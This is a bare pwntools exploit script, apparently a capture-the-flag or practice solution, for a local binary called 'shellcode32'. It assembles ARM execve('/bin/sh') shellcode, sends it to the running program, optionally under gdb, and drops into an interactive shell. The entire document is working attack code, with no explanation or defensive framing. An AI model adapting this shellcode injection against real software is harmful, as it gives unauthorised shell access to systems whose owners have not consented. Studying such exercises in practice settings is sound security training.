#!/usr/bin/env python2
from pwn import *

exe = ELF("./shellcode32")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0xfffde5fc
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path,gdbscript=breakpoints)

def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

shellcode = asm("""
    ldr r5,=0x68732f
    push {r5}
    ldr r5,=0x6e69622f
    push {r5}
    mov r7,0xb
    push {sp}
    pop {r0}
    mov r2,0
    swi 0
    """)

sl(shellcode)

io.interactive()